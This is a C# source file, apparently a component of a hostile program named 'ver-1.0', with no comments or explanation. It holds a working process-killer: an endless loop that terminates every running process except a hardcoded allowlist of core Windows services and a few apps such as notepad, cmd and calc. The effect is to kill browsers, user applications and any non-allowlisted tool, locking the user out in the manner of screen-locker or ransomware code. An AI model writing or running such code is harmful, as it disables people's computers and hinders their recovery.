using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;

namespace version1
{
    public class kill_process
    {
        public void process_kill()
        {
            while(true)
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process proces_n in processes)
                {
                    try
                    {
                        if (proces_n.ProcessName != "ver-1.0" && proces_n.ProcessName != "explorer" &&
                        proces_n.ProcessName != "audiodg" && proces_n.ProcessName != "CompatTelRunner"
                        && proces_n.ProcessName != "conhost" && proces_n.ProcessName != "csrss" &&
                        proces_n.ProcessName != "ctfmon" && proces_n.ProcessName != "dllhost" &&
                        proces_n.ProcessName != "dwm" && proces_n.ProcessName != "fontdrvhost" &&
                        proces_n.ProcessName != "lsass" && proces_n.ProcessName != "MoUsoCoreWorker" &&
                        proces_n.ProcessName != "MpCmdRun" && proces_n.ProcessName != "msdtc" &&
                        proces_n.ProcessName != "NisSrv" && proces_n.ProcessName != "notepad" &&
                        proces_n.ProcessName != "ntoskrnl" && proces_n.ProcessName != "RuntimeBroker" &&
                        proces_n.ProcessName != "SearchApp" && proces_n.ProcessName != "SearchIndexer" &&
                        proces_n.ProcessName != "SecurityHealthService" && proces_n.ProcessName != "services" &&
                        proces_n.ProcessName != "SgrmBroker" && proces_n.ProcessName != "ShellExperienceHost" &&
                        proces_n.ProcessName != "sihost" && proces_n.ProcessName != "smartscreen" &&
                        proces_n.ProcessName != "smss" && proces_n.ProcessName != "spoolsv" &&
                        proces_n.ProcessName != "StartMenuExperienceHost" && proces_n.ProcessName != "svchost" &&
                        proces_n.ProcessName != "ntoskrnl" && proces_n.ProcessName != "System" &&
                        proces_n.ProcessName != "System Idle Process" && proces_n.ProcessName != "System interrupts" &&
                        proces_n.ProcessName != "taskhostw" && proces_n.ProcessName != "TextInputHost" &&
                        proces_n.ProcessName != "TiWorker" && proces_n.ProcessName != "TrustedInstaller" &&
                        proces_n.ProcessName != "UserOOBEBroker" && proces_n.ProcessName != "VGAuthService" &&
                        proces_n.ProcessName != "vm3dservice" && proces_n.ProcessName != "vmtoolsd" &&
                        proces_n.ProcessName != "wininit" && proces_n.ProcessName != "winlogon" &&
                        proces_n.ProcessName != "WmiPrvSE" && proces_n.ProcessName != "WmiPrvSE" &&
                        proces_n.ProcessName != "wuauclt" && proces_n.ProcessName != "cmd" && 
                        proces_n.ProcessName != "mspaint" && proces_n.ProcessName != "calc" &&
                        proces_n.ProcessName != "CalculatorApp")
                            proces_n.Kill();
                    }
                    catch { }
                }
                Thread.Sleep(1);
            }
        }
    }
}
